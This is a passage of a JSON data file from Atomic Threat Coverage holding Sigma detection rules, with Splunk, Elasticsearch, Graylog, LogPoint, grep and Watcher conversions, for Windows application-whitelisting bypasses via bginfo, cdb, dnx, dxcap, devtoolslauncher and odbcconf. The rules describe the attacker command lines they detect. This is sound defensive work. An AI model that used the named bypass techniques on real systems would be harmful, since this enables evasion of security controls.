\"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'MavInject Process Injection\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:* \\\\/INJECTRUNNING *", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"* /INJECTRUNNING *\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"* /INJECTRUNNING *\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.* /INJECTRUNNING .*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Application whitelisting bypass via bginfo\nid: aaf46cdc-934e-4284-b329-34aa701e3771\nstatus: experimental\ndescription: Execute VBscript code that is referenced within the *.bgi file.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml\n    - https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n  selection:\n    Image|endswith: '\\bginfo.exe'\n    CommandLine|contains|all:\n        - '/popup'\n        - '/nolicprompt'\n  condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Application whitelisting bypass via bginfo\nid: aaf46cdc-934e-4284-b329-34aa701e3771\nstatus: experimental\ndescription: Execute VBscript code that is referenced within the *.bgi file.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Bginfo.yml\n    - https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n  selection:\n    Image|endswith: '\\bginfo.exe'\n    CommandLine|contains|all:\n        - '/popup'\n        - '/nolicprompt'\n  condition: selection\nfalsepositives:\n    - Unknown", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\bginfo.exe AND CommandLine.keyword:*\\\\/popup* AND CommandLine.keyword:*\\\\/nolicprompt*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Application-whitelisting-bypass-via-bginfo <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Application whitelisting bypass via bginfo\",\\n    \"description\": \"Execute VBscript code that is referenced within the *.bgi file.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\bginfo.exe AND CommandLine.keyword:*\\\\\\\\/popup* AND CommandLine.keyword:*\\\\\\\\/nolicprompt*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\bginfo.exe AND CommandLine.keyword:*\\\\\\\\/popup* AND CommandLine.keyword:*\\\\\\\\/nolicprompt*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Application whitelisting bypass via bginfo\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\bginfo.exe AND CommandLine.keyword:*\\\\/popup* AND CommandLine.keyword:*\\\\/nolicprompt*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\bginfo.exe\" CommandLine=\"*/popup*\" CommandLine=\"*/nolicprompt*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\bginfo.exe\" CommandLine=\"*/popup*\" CommandLine=\"*/nolicprompt*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\bginfo\\\\.exe)(?=.*.*/popup.*)(?=.*.*/nolicprompt.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible Application Whitelisting Bypass via WinDbg/CDB as a shellcode runner\nid: b5c7395f-e501-4a08-94d4-57fe7a9da9d2\nstatus: experimental\ndescription: Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml\n    - http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cdb.exe'\n        CommandLine|contains: '-cf'\n    condition: selection\nfalsepositives:\n    - Legitimate use of debugging tools", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Application Whitelisting Bypass via WinDbg/CDB as a shellcode runner\nid: b5c7395f-e501-4a08-94d4-57fe7a9da9d2\nstatus: experimental\ndescription: Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml\n    - http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cdb.exe'\n        CommandLine|contains: '-cf'\n    condition: selection\nfalsepositives:\n    - Legitimate use of debugging tools", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\cdb.exe AND CommandLine.keyword:*\\\\-cf*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Application-Whitelisting-Bypass-via-WinDbg/CDB-as-a-shellcode-runner <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Application Whitelisting Bypass via WinDbg/CDB as a shellcode runner\",\\n    \"description\": \"Launch 64-bit shellcode from the x64_calc.wds file using cdb.exe.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\cdb.exe AND CommandLine.keyword:*\\\\\\\\-cf*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\cdb.exe AND CommandLine.keyword:*\\\\\\\\-cf*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Application Whitelisting Bypass via WinDbg/CDB as a shellcode runner\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\cdb.exe AND CommandLine.keyword:*\\\\-cf*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\cdb.exe\" CommandLine=\"*-cf*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\cdb.exe\" CommandLine=\"*-cf*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\cdb\\\\.exe)(?=.*.*-cf.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Devtoolslauncher.exe executes specified binary\nid: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6\nstatus: experimental\ndescription: The Devtoolslauncher.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml\n    - https://twitter.com/_felamos/status/1179811992841797632\nauthor: Beyu Denis, oscd.community (rule), @_felamos (idea)\ndate: 2019/10/12\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: critical\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\devtoolslauncher.exe'\n        CommandLine|contains: 'LaunchForDeploy'\n    condition: selection\nfalsepositives:\n    - Legitimate use of devtoolslauncher.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Devtoolslauncher.exe executes specified binary\nid: cc268ac1-42d9-40fd-9ed3-8c4e1a5b87e6\nstatus: experimental\ndescription: The Devtoolslauncher.exe executes other binary\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devtoolslauncher.yml\n    - https://twitter.com/_felamos/status/1179811992841797632\nauthor: Beyu Denis, oscd.community (rule), @_felamos (idea)\ndate: 2019/10/12\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: critical\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\devtoolslauncher.exe'\n        CommandLine|contains: 'LaunchForDeploy'\n    condition: selection\nfalsepositives:\n    - Legitimate use of devtoolslauncher.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\devtoolslauncher.exe AND CommandLine.keyword:*LaunchForDeploy*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Devtoolslauncher.exe-executes-specified-binary <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Devtoolslauncher.exe executes specified binary\",\\n    \"description\": \"The Devtoolslauncher.exe executes other binary\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\devtoolslauncher.exe AND CommandLine.keyword:*LaunchForDeploy*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\devtoolslauncher.exe AND CommandLine.keyword:*LaunchForDeploy*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Devtoolslauncher.exe executes specified binary\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\devtoolslauncher.exe AND CommandLine.keyword:*LaunchForDeploy*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\devtoolslauncher.exe\" CommandLine=\"*LaunchForDeploy*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\devtoolslauncher.exe\" CommandLine=\"*LaunchForDeploy*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\devtoolslauncher\\\\.exe)(?=.*.*LaunchForDeploy.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Application Whitelisting bypass via dnx.exe\nid: 81ebd28b-9607-4478-bf06-974ed9d53ed7\nstatus: experimental\ndescription: Execute C# code located in the consoleapp folder\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml\n    - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnx.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of dnx.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Application Whitelisting bypass via dnx.exe\nid: 81ebd28b-9607-4478-bf06-974ed9d53ed7\nstatus: experimental\ndescription: Execute C# code located in the consoleapp folder\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Csi.yml\n    - https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dnx.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use of dnx.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "Image.keyword:*\\\\\\\\dnx.exe", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Application-Whitelisting-bypass-via-dnx.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Application Whitelisting bypass via dnx.exe\",\\n    \"description\": \"Execute C# code located in the consoleapp folder\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\dnx.exe\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"Image.keyword:*\\\\\\\\\\\\\\\\dnx.exe\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Application Whitelisting bypass via dnx.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "Image.keyword:*\\\\\\\\dnx.exe", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "Image=\"*\\\\\\\\dnx.exe\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\dnx.exe\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\dnx\\\\.exe'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Application Whitelisting bypass via dxcap.exe\nid: 60f16a96-db70-42eb-8f76-16763e333590\nstatus: experimental\ndescription: Detects execution of of Dxcap.exe\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml\n    - https://twitter.com/harr0ey/status/992008180904419328\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dxcap.exe'\n        CommandLine|contains|all:\n            - '-c'\n            - '.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate execution of dxcap.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Application Whitelisting bypass via dxcap.exe\nid: 60f16a96-db70-42eb-8f76-16763e333590\nstatus: experimental\ndescription: Detects execution of of Dxcap.exe\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dxcap.yml\n    - https://twitter.com/harr0ey/status/992008180904419328\nauthor: Beyu Denis, oscd.community\ndate: 2019/10/26\nmodified: 2019/11/04\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\dxcap.exe'\n        CommandLine|contains|all:\n            - '-c'\n            - '.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate execution of dxcap.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\dxcap.exe AND CommandLine.keyword:*\\\\-c* AND CommandLine.keyword:*.exe*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Application-Whitelisting-bypass-via-dxcap.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Application Whitelisting bypass via dxcap.exe\",\\n    \"description\": \"Detects execution of of Dxcap.exe\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\dxcap.exe AND CommandLine.keyword:*\\\\\\\\-c* AND CommandLine.keyword:*.exe*)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\dxcap.exe AND CommandLine.keyword:*\\\\\\\\-c* AND CommandLine.keyword:*.exe*)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Application Whitelisting bypass via dxcap.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\dxcap.exe AND CommandLine.keyword:*\\\\-c* AND CommandLine.keyword:*.exe*)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\dxcap.exe\" CommandLine=\"*-c*\" CommandLine=\"*.exe*\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" Image=\"*\\\\\\\\dxcap.exe\" CommandLine=\"*-c*\" CommandLine=\"*.exe*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*.*\\\\dxcap\\\\.exe)(?=.*.*-c.*)(?=.*.*\\\\.exe.*))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible Application Whitelisting Bypass via dll loaded by odbcconf.exe\nid: 65d2be45-8600-4042-b4c0-577a1ff8a60e\ndescription: Detects defence evasion attempt via odbcconf.exe execution to load DLL\nstatus: experimental\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml\n    - https://twitter.com/Hexacorn/status/1187143326673330176\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/07\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\odbcconf.exe'\n        CommandLine|contains: \n            - '-f'\n            - 'regsvr'\n    selection_2:\n        ParentImage|endswith: '\\odbcconf.exe'\n        Image|endswith: '\\rundll32.exe'\n    condition: selection_1 or selection_2\nlevel: medium\nfalsepositives:\n    - Legitimate use of odbcconf.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Application Whitelisting Bypass via dll loaded by odbcconf.exe\nid: 65d2be45-8600-4042-b4c0-577a1ff8a60e\ndescription: Detects defence evasion attempt via odbcconf.exe execution to load DLL\nstatus: experimental\nreferences:\n    - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Odbcconf.yml\n    - https://twitter.com/Hexacorn/status/1187143326673330176\nauthor: Kirill Kiryanov, Beyu Denis, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/25\nmodified: 2019/11/07\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        Image|endswith: '\\odbcconf.exe'\n        CommandLine|contains: \n            - '-f'\n            - 'regsvr'\n    selection_2:\n        ParentImage|endswith: '\\odbcconf.exe'\n        Image|endswith: '\\rundll32.exe'\n    condition: selection_1 or selection_2\nlevel: medium\nfalsepositives:\n    - Legitimate use of odbcconf.exe by legitimate user", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\odbcconf.exe AND CommandLine.keyword:(*\\\\-f* OR *regsvr*)) OR (ParentImage.keyword:*\\\\\\\\odbcconf.exe AND Image.keyword:*\\\\\\\\rundll32.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Application-Whitelisting-Bypass-via-dll-loaded-by-odbcconf.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Application Whitelisting Bypass via dll loaded by odbcconf.exe\",\\n    \"description\": \"Detects defence evasion attempt via odbcconf.exe execution to load DLL\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.execution\",\\n      \"attack.t1218\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\odbcconf.exe AND CommandLine.keyword:(*\\\\\\\\-f* OR *regsvr*)) OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\odbcconf.exe AND Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\odbcconf.exe AND CommandLine.keyword:(*\\\\\\\\-f* OR *regsvr*)) OR (ParentImage.keyword:*\\\\\\\\\\\\\\\\odbcconf.exe AND Image.keyword:*\\\\\\\\\\\\\\\\rundll32.exe))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Application Whitelisting Bypass via dll loaded by odbcconf.exe\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\odbcconf.exe AND CommandLine.keyword:(*\\\\-f* *regsvr*)) OR (ParentImage.keyword:*\\\\\\\\odbcconf.exe AND Image.keyword:*\\\\\\\\rundll32.exe))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\odbcconf.exe\" (CommandLine=\"*-f*\" OR CommandLine=\"*regsvr*\")) OR (ParentImage=\"*\\\\\\\\odbcconf.exe\" Image=\"*\\\\\\\\rundll32.exe\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\odbcconf.exe\" CommandLine IN [\"*-f*\", \"*regsvr*\"]) OR (ParentImage=\"*\\\\\\\\odbcconf.exe\" Image=\"*\\\\\\\\rundll32.exe\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P 